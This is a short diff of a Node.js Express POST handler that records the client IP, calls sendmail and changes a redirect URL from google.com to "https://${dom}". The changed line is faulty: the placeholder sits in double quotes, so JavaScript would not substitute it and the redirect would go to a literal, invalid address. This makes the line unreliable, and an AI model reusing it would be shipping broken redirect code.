@@ -60,7 +60,7 @@ app.post("/", (req, res) => {
  
   let ip2 = requestIp.getClientIp(req);
 
-  let redirectUrl = "https://www.google.com";
+  let redirectUrl = "https://${dom}";
 
   sendmail(
     {
